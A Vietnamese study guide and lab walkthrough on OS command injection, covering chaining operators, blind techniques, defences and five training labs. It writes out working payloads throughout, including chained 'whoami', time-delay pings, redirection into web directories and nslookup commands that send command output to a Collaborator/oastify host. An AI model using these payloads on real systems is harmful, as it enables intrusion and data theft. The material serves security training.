# OS COMMAND INJECTION — KIẾN THỨC TỔNG HỢP & STEP BY STEP

## Mục lục
1. [OS command injection là gì?](#1-os-command-injection-là-gì)
2. [Toán tử nối lệnh theo hệ điều hành](#2-toán-tử-nối-lệnh-theo-hệ-điều-hành)
3. [Blind command injection](#3-blind-command-injection)
4. [Cách phòng chống](#4-cách-phòng-chống)
5. [Lab step-by-step](#5-lab-step-by-step)

## 1. OS command injection là gì?

Xảy ra khi ứng dụng đưa input người dùng vào 1 lệnh hệ điều hành được thực thi qua shell (ví dụ dùng hàm `system()`, `exec()`, `popen()`) mà không kiểm soát đủ chặt, cho phép attacker chèn thêm lệnh tuỳ ý được thực thi trên server.

## 2. Toán tử nối lệnh theo hệ điều hành

| Toán tử | Hệ điều hành | Ý nghĩa |
|---|---|---|
| `;` | Linux | Chạy lệnh tiếp theo bất kể lệnh trước thành công hay không |
| `\n` | Linux | Tương tự `;` |
| `&` | Windows | Chạy lệnh tiếp theo bất kể kết quả trước |
| `&&` | Linux, Windows | Chạy lệnh tiếp theo NẾU lệnh trước thành công |
| `\|\|` | Linux, Windows | Chạy lệnh tiếp theo NẾU lệnh trước thất bại |
| `\|` | Linux, Windows | Pipe — output lệnh trước làm input lệnh sau, chỉ hiện output lệnh sau |
| `` ` command ` `` | Linux | Command substitution — output được chèn ngược lại vào chỗ gọi |
| `$(command)` | Linux | Command substitution (cú pháp hiện đại) |

**Ví dụ payload cơ bản (input là tên file cho chức năng "check stock" gọi lệnh `stockreport filename`):**
```
productId=1&storeId=1;whoami
```
Nếu backend chạy: `stockreport 1 1;whoami` → lệnh `whoami` được thực thi thêm, kết quả xuất hiện trong response.

## 3. Blind command injection

Khi output lệnh không hiển thị trực tiếp trong response, dùng các kỹ thuật tương tự blind SQLi:

**Time-based:**
```
& ping -c 10 127.0.0.1 &
```
Nếu response chậm ~10 giây → xác nhận lệnh được thực thi.

**Output redirection (ghi kết quả ra file rồi đọc lại qua lỗ hổng khác, ví dụ path traversal hoặc endpoint tải file tĩnh):**
```
& whoami > /var/www/images/output.txt &
```
Sau đó truy cập `GET /images/output.txt` để đọc kết quả.

**Out-of-band (OOB) qua Burp Collaborator:**
```
& nslookup `whoami`.SUBDOMAIN.burpcollaborator.net &
```
Kết quả lệnh `whoami` được nhúng vào subdomain DNS query, Collaborator ghi nhận và hiển thị giá trị.

## 4. Cách phòng chống

- Tránh hoàn toàn việc gọi lệnh hệ thống với input người dùng nếu có thể — dùng API/thư viện native của ngôn ngữ thay vì gọi shell command.
- Nếu bắt buộc, dùng API cho phép truyền tham số **tách biệt** (không qua shell interpreter, ví dụ `ProcessBuilder` với danh sách argument riêng thay vì 1 chuỗi lệnh), tránh mọi hình thức string concatenation.
- Whitelist input nghiêm ngặt (chỉ cho phép alphanumeric nếu là filename/ID).
- Chạy tiến trình với quyền hạn tối thiểu (không chạy bằng root).

## 5. Lab step-by-step

### Lab 1: OS command injection, simple case
**Mục tiêu:** Thực thi lệnh `whoami`, kết quả hiển thị trực tiếp trong response.
- **B1:** Vào chức năng "Check stock", dùng Burp bắt request `POST /product/stock` có tham số `storeId`.
- **B2:** Sửa `storeId=1|whoami` (hoặc `storeId=1; whoami`), gửi request.
- **B3:** Response trả về kèm kết quả lệnh `whoami` (ví dụ `peter-XXXX`) → lab solved.

### Lab 2: Blind OS command injection with time delays
**Mục tiêu:** Xác nhận command injection tồn tại qua độ trễ thời gian (không có output trực tiếp).
- **B1:** Vào form "Submit feedback", gửi giá trị email chứa payload:
  ```
  email=x@x.com||ping+-c+10+127.0.0.1||
  ```
- **B2:** Quan sát response chậm hơn ~10 giây so với bình thường → xác nhận lệnh được thực thi → lab solved.

### Lab 3: Blind OS command injection with output redirection
**Mục tiêu:** Ghi kết quả lệnh ra file tĩnh rồi đọc lại qua URL công khai.
- **B1:** Gửi payload trong form feedback ghi kết quả `whoami` ra thư mục ảnh public:
  ```
  email=x@x.com||whoami>/var/www/images/output.txt||
  ```
- **B2:** Truy cập `GET /image?filename=output.txt` (hoặc đường dẫn ảnh tĩnh tương ứng của lab).
- **B3:** Đọc được nội dung file chứa kết quả `whoami` → lab solved.

### Lab 4: Blind OS command injection with out-of-band interaction
**Mục tiêu:** Xác nhận command injection thuần túy bằng DNS interaction (Burp Collaborator), không cần output trực tiếp hay đo thời gian.
- **B1:** Lấy payload Collaborator từ Burp (subdomain duy nhất).
- **B2:** Gửi payload trong form feedback:
  ```
  email=x@x.com||nslookup+abcxyz.oastify.com||
  ```
- **B3:** Poll Collaborator → nếu ghi nhận DNS interaction từ server lab → xác nhận command injection tồn tại → lab solved.

### Lab 5: Blind OS command injection with out-of-band data exfiltration
**Mục tiêu:** Không chỉ xác nhận mà còn trích xuất kết quả lệnh (ví dụ nội dung file `/etc/passwd` hoặc output `whoami`) qua kênh DNS.
- **B1:** Lấy payload Collaborator.
- **B2:** Gửi payload nhúng kết quả lệnh vào subdomain DNS:
  ```
  email=x@x.com||nslookup+`whoami`.abcxyz.oastify.com||
  ```
- **B3:** Poll Collaborator, đọc phần subdomain đầu tiên trong interaction ghi nhận (ví dụ `peter-abc123.abcxyz.oastify.com`) → chính là output của lệnh `whoami` → lab solved.

## Tổng kết
- Luôn thử các toán tử nối lệnh phổ biến (`;`, `&&`, `||`, `|`, `` ` ` ``, `$()`) khi nghi ngờ input được đưa vào shell command.
- Với blind command injection, ưu tiên kỹ thuật OOB (qua Collaborator) vì vừa an toàn (không ảnh hưởng hệ thống) vừa lấy được dữ liệu trực tiếp, tương tự cách tiếp cận ở blind SQLi.

